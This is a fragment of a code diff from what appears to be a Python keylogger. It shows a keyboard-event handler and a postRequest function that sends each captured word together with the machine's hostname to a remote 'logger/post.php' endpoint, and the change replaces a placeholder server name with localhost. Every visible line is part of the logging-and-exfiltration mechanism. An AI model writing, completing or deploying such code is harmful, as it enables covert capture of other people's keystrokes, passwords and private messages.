@@ -21,7 +21,7 @@ hostname = platform.node()
 def postRequest(param):
   global hostname
   payload = {'word' : param, 'hostname' : hostname}
-  r = requests.post('http://your_server_name/logger/post.php',data=payload)
+  r = requests.post('http://localhost/logger/post.php',data=payload)
 
 def OnKeyboardEvent(event):
   global flag
